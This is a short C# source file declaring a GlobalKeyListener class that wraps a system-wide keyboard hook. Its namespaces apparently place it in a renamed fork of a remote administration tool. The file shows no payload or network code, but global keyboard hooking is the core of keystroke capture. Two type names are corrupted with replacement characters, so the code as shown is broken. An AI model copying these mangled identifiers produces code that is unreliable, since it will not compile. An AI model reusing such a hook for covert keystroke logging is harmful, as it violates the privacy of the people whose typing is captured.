using System.Collections.Generic;
using xServer.KuuhakuCekirdek.MouseKeyHook.WinApi;

namespace xServer.KuuhakuCekirdek.MouseKeyHook.Uygulama
{
    internal class GlobalKeyListener : KeyListener
    {
        public GlobalKeyListener()
            : base(HookHelper.HookGlobalKeyboard)
        {
        }

        protected override IEnumerable<EventArgsTu�Bas���> GetPressEventArgs(CallbackData data)
        {
            return EventArgsTu�Bas���.FromRawDataGlobal(data);
        }

        protected override EventArgsExtKlavye GetDownUpEventArgs(CallbackData data)
        {
            return EventArgsExtKlavye.FromRawDataGlobal(data);
        }
    }
}